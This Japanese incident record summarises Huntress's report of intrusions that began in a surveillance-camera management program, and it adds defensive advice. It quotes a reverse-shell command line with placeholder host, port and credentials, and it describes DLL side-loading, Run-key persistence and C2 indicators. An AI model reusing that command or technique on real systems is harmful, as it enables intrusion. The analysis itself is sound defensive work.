INC-2026-0765Huntress が監視カメラ管理ソフト侵害を報告

セキュリティ企業 **Huntress** は2026年10月27日、 **2026年9月から10月にかけて複数の顧客環境で、 監視カメラの管理ソフト（`CMS.exe`）を起点とする侵害を観測したと公表した**（出典1）。 **Huntress は「すべての事案で、攻撃者が正規の監視カメラ管理システムを侵害し、 それを初期侵入経路にした」と評価している**（出典1。原文英語）。 **侵入後の流れは事案をまたいでおおむね共通していた**（出典1）—— **①`C:\Program Files (x86)\CMS\CMS.exe` から、 ②利用者の `AppData\Roaming\CMS\RemoteSetup\` に `rs.win32.exe` を置いて リモートIP・ポート 8000・`admin` という利用者名を引数に起動し（Huntress はこれを リバースシェルと見ている）、 ③`AppData\Local\Microsoft\WpcMon\` に正規の Microsoft 製バイナリ `WpcMon.exe` （本来は `C:\Windows\system32` にある保護者による制限の監視プログラム）を置き、 ④その隣に `IPHLPAPI.DLL` と `samcli.dll` を並べて読み込ませ、 ⑤利用者の Run キーに `WpcMon.exe` を登録して永続化し、 ⑥`144.172.116[.]37` へビーコンを出していた**（出典1）。 **2つの DLL は一見 zlib の圧縮ライブラリだが、 定期的に外部の C2 へ接続する機能が加えられていた**（出典1）。 **ただし、カメラ管理ソフトがどのように侵害されたのかは分かっていない** 〈未確定1〉——**Huntress は、実行ファイルにバージョン情報の節が無く開発元を特定できず、 アプリケーションのログも見つけられなかったとしている**（出典1）。 **実行ファイルに含まれていた文字列（`developerslavery`・ `hxxp://cloudapi.3r-dataware[.]com/sso/`）と、 `kvision[.]ai` で配布されている同名の「CMS」パッケージが 同じ文字列を含むことまでは示されたが、 Huntress は「可能性のある出所として提示するものであり、 ベンダーとの関係を断定するものではない」と明記している**（出典1。原文英語）〈齟齬2〉。 **被害組織の名称・業種・国・件数はいずれも公表されていない** 〈未確定2・3〉（本記録の確認）。 **本記録が中心と見るのは1点である**（本記録の評価）—— **止まらなかったのは「監視カメラの管理ソフトが、 守るべきソフトウェアの一覧に入っていなかった」からであり、 侵入後の手口（正規バイナリの DLL サイドロード・Run キー・ビーコン）は 10年前から変わっていない。**

脅威・攻撃キャンペーン不正アクセス・侵害初報のみ有名事象として記録（日本と直接の関係は薄い）公表されていない／不明
初報: 2026年10月27日（Huntress のブログ公表） 最終更新: 2026年10月29日（本記録の作成時点）

これは、資産台帳に載っていないソフトウェアが侵入口になった事例である。

監視カメラの管理ソフトは、多くの組織で「施設管理の付属品」として入る。IT 部門の資産台帳にも、脆弱性管理の対象にも、EDR の除外設定の見直し対象にも入らないことがある。Huntress が観測したのは、まさにそこから入られた複数の事案である（出典1）。

侵入後の手口に新しいものは無い。正規の Microsoft 製バイナリを本来と違う場所に置き、その隣に細工した DLL を並べて読み込ませ、Run キーで永続化し、固定の IP へビーコンを出す——どれも既知の型である。新しかったのは入口だけである。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

**出典1 が示す流れを、本記録が段階に整理したものである。** **公表されているのは「初期侵入の起点がカメラ管理ソフトだったこと」と 「侵入後にどのファイルがどこへ置かれ何に接続したか」までで、 カメラ管理ソフトがどう侵害されたか、その後に何が行われたかは示されていない** 〈未確定1・8〉（本記録の確認）。 **Huntress 自身が「すべての事案で攻撃者が正規の監視カメラ管理システムを 侵害し初期侵入経路にしたと評価する」という書き方をしている** （出典1。原文英語）〈重要〉 ——**「評価する（assess）」であって「確認した」ではない。** **検知の機会は、Huntress が実際に検知した段階 （実行・検知回避・永続化・C2通信）については「機会があり検知した」とし、 初期侵入については「公表されていない」とした。**

  1. 1. 初期侵入推定[1]
    **`C:\Program Files (x86)\CMS\CMS.exe` （監視カメラの管理ソフト）が侵入の起点だった**（出典1）〈重要〉。 **Huntress は「すべての事案で、攻撃者が正規の監視カメラ管理システムを 侵害し、それを初期侵入経路にした」と評価している** （出典1。原文英語）。 **実行ファイルにはバージョン情報の節が無く、開発元・製品名は特定できなかった** （出典1）。 **含まれていた特徴的な文字列は `developerslavery`・`d3e3v4e3l9o9p0e3r4s2l9a1v4e3r4y6`・ `hxxp://cloudapi.3r-dataware[.]com/sso/` の3つである**（出典1）。 **どのように侵害されたかは示されていない**〈未確定1〉。
    根拠: 複数顧客環境のプロセスツリー（`CMS.exe` が親）とネットワーク接続の記録（出典1）
  2. 2. 実行確認済[1]
    **攻撃者は `rs.win32.exe` を `C:\Users\<user>\AppData\Roaming\CMS\RemoteSetup\` に置いた**（出典1）。 **起動時のコマンドラインは `rs.win32.exe -i "<IP Address>" -p "8000" -c <file> -r <file> "admin" "1234567a7654321"` で、リモートIP・ポート 8000・遠隔操作セッションの認証に使う `admin` という利用者名が渡されていた**（出典1）。 **Huntress はこれをリバースシェルと見ている**（出典1）〈重要〉 ——**根拠として、 ①リモートIPとポートが引数で与えられていること、 ②`admin` の資格情報が渡されていること、 ③保護されたアプリケーションのディレクトリではなく 利用者が書き込める `AppData\Roaming` 配下から動いていること、 の3点を挙げている**（出典1）。
    根拠: エンドポイントのプロセス実行記録とコマンドライン（出典1）
  3. 3. 検知回避確認済[1]
    **攻撃者は正規の Microsoft 製バイナリ `WpcMon.exe` を `C:\Users\<user>\AppData\Local\Microsoft\WpcMon\` に置いた**（出典1）。 **Huntress は SHA256 により、これが正規の Windows Parental Control Monitor（保護者による制限の監視プログラム） であることを確認している**（出典1）〈重要〉 ——**異常なのはファイルではなく置き場所である。 本来は `C:\Windows\system32` にある。** **同じフォルダに `IPHLPAPI.DLL` と `samcli.dll` を並べ、 `WpcMon.exe` に読み込ませた（DLL サイドロード）**（出典1）。 **2つの DLL は一見 zlib の圧縮ライブラリだが、 定期的に外部の C2 へ接続するビーコン機能が加えられていた**（出典1）。
    根拠: ファイルの配置パスと SHA256、および DLL の解析結果（出典1）
  4. 4. 永続化確認済[1]
    **利用者の Run レジストリキーに、 設置した `WpcMon.exe` へのパスを値として追加した**（出典1）。 **Huntress は「攻撃者は利用者の Run キーにプログラムのパスを足して、 その利用者がサインインするたびに Windows が ペイロードを自動起動するようにするのが通例だ」と説明している** （出典1。原文英語）。
    根拠: レジストリの Run キーに追加された値（出典1 の図4）
  5. 5. C2通信確認済[1]
    **すべての事案で、影響を受けたエンドポイントから観測された C2 の IP アドレスは `144.172.116[.]37` だった**（出典1）〈重要〉 ——**複数の顧客環境で同一の IP が使われていたことが、 Huntress が「同じ攻撃者による一連の活動」と見た根拠の1つである** （本記録の読み）。 **ビーコンは、`WpcMon.exe` にサイドロードさせた `IPHLPAPI.DLL` / `samcli.dll` が出していた**（出典1）。
    根拠: エンドポイントで確認された稼働中のネットワーク接続（出典1 の図6）

被害組織の対応

所要日数は経過（タイムライン）の各時点から算出しています。
この事案で下された判断
  • **Huntress は、ベンダー名を断定せずに公表した**（出典1） ——**`3r-dataware[.]com`（韓国企業 3R Global）と `kvision[.]ai` の配布物という2つの手がかりを示したうえで、 「可能性のある出所として提示するものであり、 ベンダーとの関係を断定するものではない」と明記している** （出典1。原文英語）。
    トレードオフ: **得たもの**——**誤った名指しを避けた。** **実行ファイルにバージョン情報が無く、 配布経路も確認できていない状態で製品名を断定すれば、 無関係なベンダーに被害が及ぶ**（本記録の評価）。 **失ったもの**——**読者が「自社に入っているのはその製品か」を 確認できない**〈重要〉。 **本記録の評価では、これは実務上の重い代償である** ——**CISO が部下に出せる指示が 「`C:\Program Files (x86)\CMS\CMS.exe` というパスを探せ」までで止まる。** **ただし、Huntress は同時に 「カメラ管理ソフト全般を入口として扱え」という 製品名に依存しない行動指針を示しており**（出典1）、 **これが代償を部分的に埋めている**（本記録の評価）。

入口になったのは、IT の資産台帳に載っていないソフトウェアだった原因・手口

Huntress の書き出しは、技術の話ではない（出典1。原文英語）——

セキュリティチームは、攻撃者が狙うと知っているソフトウェアに注目しがちである。しかし、組織の環境に触れるあらゆるソフトウェアに弱点はありうる。「従来の」攻撃面の一部とは見なされていない道具も含めて。

そのうえで挙げられたのが、監視カメラの管理基盤である（出典1）。

本件で起点になったのは、C:\Program Files (x86)\CMS\CMS.exe という1つの実行ファイルだった（出典1）。Huntress は「すべての事案で、攻撃者が正規の監視カメラ管理システムを侵害し、それを初期侵入経路にした」と評価している（出典1。原文英語）。

この実行ファイルについて分かっていることは少ない（出典1）——

  • バージョン情報の節が埋め込まれておらず、開発元も製品の正式名称も特定できない
  • アプリケーションのログが見つからない
  • 中に developerslavery という文字列と、hxxp://cloudapi.3r-dataware[.]com/sso/ という外向きの宛先が入っている

本記録が中心と見るのはここである（本記録の評価）〈重要〉。バージョン情報が無いソフトウェアは、資産管理ツールの棚卸しに「製品名」として現れない。ログの無いソフトウェアは、侵害されても後から再現できない。つまり、このソフトウェアは最初から「管理されない前提」で組織の中に置かれていた。

攻撃者がどうやってこのソフトウェアを侵害したかは、分かっていない〈未確定1〉。Huntress 自身が「可視性が限られた」と書いている（出典1。原文英語）。配布元の改ざんなのか、導入済みの実体の脆弱性なのか、管理画面の資格情報が破られたのかが分からない（本記録の確認）——この3つは取るべき行動が全く違う。

侵入後の手口に新しいものは無く、すべて利用者が書き込める場所で起きた原因・手口

侵入後の流れは、事案をまたいでおおむね共通していた（出典1）。4つの段階に分けられる。

① リバースシェルの設置。 rs.win32.exe をC:\Users\<user>\AppData\Roaming\CMS\RemoteSetup\ に置き、次のコマンドラインで起動した（出典1）——

rs.win32.exe -i "<IP Address>" -p "8000" -c <file> -r <file> "admin" "1234567a7654321"

Huntress がこれをリバースシェルと見た根拠は3つである（出典1）——リモートIPとポート 8000 が引数で与えられていること、遠隔操作セッションの認証用に admin が渡されていること、保護されたアプリケーションのディレクトリではなく利用者が書き込める AppData\Roaming 配下から動いていること。

② 正規バイナリの移設。正規の Microsoft 製 WpcMon.exe（Windows Parental Control Monitor）をC:\Users\<user>\AppData\Local\Microsoft\WpcMon\ に置いた（出典1）。Huntress は SHA256 で正規品であることを確認している（出典1）〈重要〉——ファイルは本物である。異常なのは、本来の C:\Windows\system32 ではない場所にあることだけである。

③ DLL サイドロード。同じフォルダに IPHLPAPI.DLL と samcli.dll を並べ、WpcMon.exe に読み込ませた（出典1）。2つの DLL は一見 zlib の圧縮ライブラリだが、定期的に外部の C2 へ接続する機能が加えられていた（出典1）。

④ 永続化とビーコン。利用者の Run キーに WpcMon.exe のパスを登録し、サインインのたびに起動するようにした（出典1）。すべての事案で、ビーコンの宛先は 144.172.116[.]37 だった（出典1）。

どれも既知の型である（本記録の評価）。署名された正規バイナリを本来と違う場所に置き、その隣に細工した DLL を並べる—— 10年前の侵害報告にも同じ形が並んでいる。

注目すべきは、4つのファイル（rs.win32.exe・WpcMon.exe・2つの DLL）がすべて利用者の書き込める場所にあることである（本記録の読み）〈重要〉。Huntress が「実務上可能な範囲で、利用者が書き込めるパスでの未承認の実行ファイル・DLL の実行をアプリケーション制御で防げ」と書いているのは、ここを指している（出典1。原文英語）。

ベンダーは特定されておらず、Huntress はあえて断定を避けた未確定事項

CMS.exe の中にあった文字列から、2つの手がかりが出た（出典1）。

1つは hxxp://cloudapi.3r-dataware[.]com/sso/ である。このドメインは、韓国企業「3R Global」を指しているとされる（出典1）。

もう1つは kvision[.]ai のダウンロードページにある「CMS」というパッケージである。 Huntress がこれを調べたところ、顧客端末の CMS.exe と同じくdeveloperslavery・d3e3v4e3l9o9p0e3r4s2l9a1v4e3r4y6・3r-dataware.com を含んでいた（出典1）。

しかし Huntress は、そこで止めた（出典1。原文英語）〈重要〉——

CMS パッケージがそのソフトウェアのダウンロードページに掲載されてはいるが、ファイルがこのウェブサイトからダウンロードされたと断定することはできない。顧客のエンドポイントで見つかった CMS.exe と kvision[.]ai のつながりは、可能性のある出所として提示するものであり、ベンダーとの関係を断定するものではない。

本記録はこの留保をそのまま保存する（本記録の明示）〈齟齬2〉。要約の過程で「Kvision 製の CMS が侵害された」と読み替えないこと。

代償もある（本記録の評価）。製品名が断定されていないため、読者が「自社に入っているのはその製品か」を確認する手段が、C:\Program Files (x86)\CMS\CMS.exe というパスと3つの特徴文字列しか無い〈重要〉。CISO が部下に出せる指示が、そこで止まる。

ただし Huntress は、製品名に依存しない行動指針を併せて示している（出典1。原文英語）——「カメラとその管理基盤を、より広い環境への入口になりうるものとして扱え。ソフトウェアを棚卸しし、アクセスを制限し、異常なプロセスと外向き通信を監視せよ。」

被害組織からも、名前の挙がった2社からも、公表は確認できていない〈齟齬4〉（本記録の観測）。

止まらなかったのは手口が新しかったからではなく、見ていなかったからである評価・解釈

本件を1行で言うと、「新しい入口 × 古い手口」である（本記録の評価）。

入口は新しい。監視カメラの管理ソフトを初期侵入経路とする複数事案の報告は、本記録が知る範囲では珍しい（本記録の読み）。多くの組織で、この種のソフトウェアは施設管理部門が導入し、IT 部門の資産台帳にも脆弱性管理の対象にも入らない。

手口は古い。リバースシェル、正規バイナリの移設、DLL サイドロード、Run キー、固定 IP へのビーコン。どれも標準的な EDR が検知対象にしている形である（本記録の評価）。現に Huntress は、rs.win32.exe 以降の段階を検知している（出典1）。

この2つを並べると、問いが立つ（本記録の評価）〈重要〉—— 検知できる手口だったのに、なぜ侵入は成立したのか。

答えは「見ていなかったから」である（本記録の読み）。本件を検知できた組織は、Huntress の監視下にあった組織である（出典1）。同じカメラ管理ソフトが、監視の配備されていない端末や施設管理ベンダーが面倒を見るサーバに入っていれば、Run キーの追加もビーコンも誰にも見られない。

日本の組織にとっての読み方は2つある（本記録の評価）。

1つ目——棚卸しの単位を「IT 部門が買ったもの」から「組織の環境で動いているもの」に広げる。監視カメラ、入退室、空調、デジタルサイネージ、会議室予約。これらは稟議も保守契約も IT 部門を通らないことが多い。

2つ目——製品名ではなく「形」で検知規則を持つ。本件の IoC（SHA256 3件・IP 1件）は、攻撃者が変えれば効かなくなる。恒久的に効くのは、「利用者が書き込める場所から実行ファイルが動く」「OS 同梱の正規バイナリが本来のパス以外から動く」「署名されたバイナリが署名の無い DLL を同じフォルダから読む」という形のほうである（本記録の評価）。

なお、本記録は出典1 が公表した IoC の悪性を独自に検証していない（本記録の明示）〈重要〉—— 照合先のテレメトリを持たないため、検知に使う場合はHuntress の公表を一次として扱うこと。

CISO・経営層への示唆
  • **資産の棚卸しを「IT 部門が買ったもの」ではなく 「組織の環境で動いているもの」の単位にする。**
    **本件の入口は監視カメラの管理ソフトである**（出典1） ——**施設管理の付属品として入り、 IT の資産台帳にも脆弱性管理の対象にも入らないことが多い。** **Huntress は「組織の環境に触れるあらゆるソフトウェアに弱点はありうる」と 書き出している**（出典1。原文英語）。
    取るべき行動 **施設管理・総務・事業部門が個別に導入したソフトウェア （監視カメラ、入退室、空調、サイネージ、会議室予約）を 1回の調査で洗い出し、所管部門と保守ベンダーを台帳に書く。** **そのうえで、各ソフトウェアについて 「ログが出るか」「更新の経路は何か」の2点だけを確認する。**
  • **「ログが出ないソフトウェア」を、 調達・更新時の判断材料として扱う。**
    **Huntress は、このアプリケーションに関連するログを 見つけることができず、 攻撃者がどうやってソフトウェアを侵害したのかへの可視性が 限られたとしている**（出典1。原文英語）〈重要〉。 **ログが無いと、侵害の有無を後から判定できない。**
    取るべき行動 **組織の環境で動くソフトウェアの調達・更新の際に、 「認証・設定変更・外部通信のログが出るか」「どこに出るか」を 確認項目に入れる。** **既に入っているものについては、 ログが出ないものを一覧にし、 ネットワーク分離の優先順位を付ける根拠にする。**
  • **脅威報告を社内に流すときに、 「この製品を使っているか」を確認できる形にして渡す。**
    **本件では開発元も製品の正式名称も特定されていない**（出典1） 〈未確定5〉——**残っているのは `C:\Program Files (x86)\CMS\CMS.exe` というパスと 3つの特徴文字列だけである。** **「監視カメラの管理ソフトが狙われた」という要約だけを回しても、 受け取った側は何も確認できない**（本記録の評価）。
    取るべき行動 **外部の脅威報告を社内に展開する様式に、 「自組織で確認する方法（具体的なパス・ハッシュ・通信先）」の欄を設ける。** **確認方法が書けない報告は、 「注意喚起」ではなく「背景情報」として区別して流す。**
  • **施設系の端末・サーバを、 エンドポイント監視の配備対象と警報の受け取り経路に含める。**
    **本件を検知できたのは、被害組織が Huntress の監視下にあったからである** （出典1）。 **侵入後の手口（Run キーへの登録・DLL サイドロード）は 標準的な検知対象だが、 監視が入っていない端末では誰にも見られない**（本記録の評価）〈重要〉。
    取るべき行動 **監視の配備率を「台数」ではなく「所管部門別」で出す。** **施設管理ベンダーが面倒を見るサーバ・端末が 何台あり、そのうち何台に監視が入っているかを数える。** **警報が上がったときに誰に届くかも、同時に決める。**
セキュリティ技術者への示唆
  • **利用者が書き込める場所（`AppData\Roaming`・`AppData\Local`）での 実行ファイル・DLL の実行を、アプリケーション制御で止める。**
